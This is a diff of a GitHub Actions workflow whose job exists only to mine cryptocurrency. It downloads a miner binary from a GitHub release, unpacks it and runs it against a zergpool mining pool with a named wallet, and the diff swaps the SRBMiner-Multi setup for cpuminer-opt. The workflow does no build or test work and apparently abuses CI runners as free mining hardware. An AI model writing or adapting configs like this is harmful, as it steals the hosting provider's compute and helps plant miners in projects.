@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-win64.zip -Outfile SRBMiner-Multi-0-7-1-win64.zip
+      run: Invoke-WebRequest https://github.com/JayDDee/cpuminer-opt/releases/download/v3.17.1/cpuminer-opt-3.17.1-windows.zip -Outfile cpuminer-opt-3.17.1-windows.zip
     - name: Seting-UP
-      run: Expand-Archive SRBMiner-Multi-0-7-1-win64.zip
+      run: Expand-Archive cpuminer-opt-3.17.1-windows.zip
     - name: Running
-      run: .\SRBMiner-Multi\SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet RRXHEEUz375MFhLyP7T9iU4s2npBZj4o7U
+      run: cpuminer-avx2.exe -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.duta -p c=MBC 
     - name: DONE
       run: exit
